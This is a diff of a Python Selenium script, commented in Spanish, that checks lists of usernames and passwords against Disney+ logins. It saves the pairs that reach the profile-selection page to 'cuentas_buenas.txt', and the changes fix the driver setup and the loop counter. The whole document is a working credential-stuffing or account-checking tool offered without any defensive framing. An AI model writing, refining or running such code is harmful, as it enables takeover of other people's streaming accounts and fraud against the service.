@@ -1,8 +1,9 @@
 #DEPURADOR DE CUENTAS DISNEY
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-import time
+from webdriver_manager.chrome import ChromeDriverManager
 import numpy as np
+import time
 #Realizamos la importacion
 import pandas as pd
 
@@ -19,7 +20,7 @@ final=len(df.values)
 cuentas_buenas=[]
 try:
     while inicio < final:
-        driver = webdriver.Chrome()
+        driver = webdriver.Chrome(ChromeDriverManager().install())
         user = df.values[inicio][0]
 
         password = df.values[inicio][1]
@@ -46,12 +47,13 @@ try:
             if str(driver.current_url) == "https://www.disneyplus.com/es-419/select-profile":
                 cuentas_buenas.append([user, password])
                 driver.close()
+                inicio = inicio + 1
             else:
                 pass
 
                 driver.close()
+                print(inicio)
                 inicio = inicio + 1
-
     dp = pd.DataFrame(cuentas_buenas, columns=['Cuenta', 'Contraseña'])
     np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")
 
